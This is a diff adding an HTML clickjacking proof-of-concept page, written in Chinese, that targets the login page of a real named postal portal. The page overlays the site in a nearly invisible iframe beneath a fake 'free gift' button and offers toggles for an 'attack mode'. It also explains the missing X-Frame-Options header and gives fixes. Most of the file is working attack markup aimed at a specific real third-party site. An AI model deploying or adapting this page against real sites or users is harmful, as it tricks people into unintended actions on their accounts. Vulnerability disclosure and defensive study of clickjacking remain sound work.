@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>VNPost Clickjacking PoC</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 20px;
+            font-family: Arial, sans-serif;
+        }
+        
+        .container {
+            position: relative;
+            width: 500px;
+            height: 400px;
+            margin: 50px auto;
+        }
+        
+        /* 恶意iframe - 透明覆盖 */
+        .evil-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;  /* 几乎透明 */
+            z-index: 2;
+            border: none;
+        }
+        
+        /* 诱骗按钮 */
+        .fake-button {
+            position: absolute;
+            top: 150px;
+            left: 150px;
+            z-index: 1;
+            padding: 20px 40px;
+            font-size: 20px;
+            background: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+        }
+        
+        .fake-button:hover {
+            background: #ff0000;
+        }
+        
+        .warning {
+            background: #ffeb3b;
+            padding: 15px;
+            margin: 20px auto;
+            width: 500px;
+            border-left: 4px solid #ff9800;
+        }
+        
+        .toggle {
+            margin: 20px auto;
+            width: 500px;
+            text-align: center;
+        }
+        
+        .toggle button {
+            padding: 10px 20px;
+            margin: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1 style="text-align:center">🎁 免费礼品领取</h1>
+    
+    <div class="warning">
+        <strong>⚠️ 这是一个Clickjacking概念验证</strong><br>
+        此页面演示了如何利用缺少X-Frame-Options的漏洞。<br>
+        用户以为点击"领取礼品"，实际上点击的是iframe中的登录按钮。
+    </div>
+    
+    <div class="toggle">
+        <button onclick="toggleOpacity(0.01)">隐藏iframe（攻击模式）</button>
+        <button onclick="toggleOpacity(0.5)">半透明（演示模式）</button>
+        <button onclick="toggleOpacity(1)">完全可见（调试模式）</button>
+    </div>
+    
+    <div class="container">
+        <!-- 恶意iframe：加载VNPost登录页面 -->
+        <iframe id="evil-iframe" 
+                class="evil-iframe" 
+                src="http://portal.vnpost.vn/login">
+        </iframe>
+        
+        <!-- 诱骗用户点击的按钮 -->
+        <button class="fake-button" onclick="alert('用户以为点了这里，实际点了iframe')">
+            🎁 点击领取免费礼品！
+        </button>
+    </div>
+    
+    <div style="text-align:center; margin-top:50px; color:#666;">
+        <p><strong>攻击原理：</strong></p>
+        <ol style="text-align:left; max-width:600px; margin:0 auto;">
+            <li>portal.vnpost.vn 缺少 X-Frame-Options header</li>
+            <li>攻击者可以将其嵌入iframe中</li>
+            <li>iframe设置为几乎透明（opacity: 0.01）</li>
+            <li>用户看到的是"领取礼品"按钮</li>
+            <li>实际点击的是iframe中的登录表单</li>
+            <li>可能导致意外的操作执行</li>
+        </ol>
+        
+        <p style="margin-top:30px;">
+            <strong>修复方法：</strong><br>
+            添加响应头: <code>X-Frame-Options: DENY</code><br>
+            或 CSP: <code>frame-ancestors 'none'</code>
+        </p>
+    </div>
+    
+    <script>
+        function toggleOpacity(value) {
+            document.getElementById('evil-iframe').style.opacity = value;
+        }
+        
+        // 页面加载时显示警告
+        window.onload = function() {
+            console.log('%c⚠️ Clickjacking PoC Loaded', 'color: red; font-size: 20px; font-weight: bold;');
+            console.log('Portal URL can be embedded in iframe - security risk!');
+        };
+    </script>
+</body>
+</html>
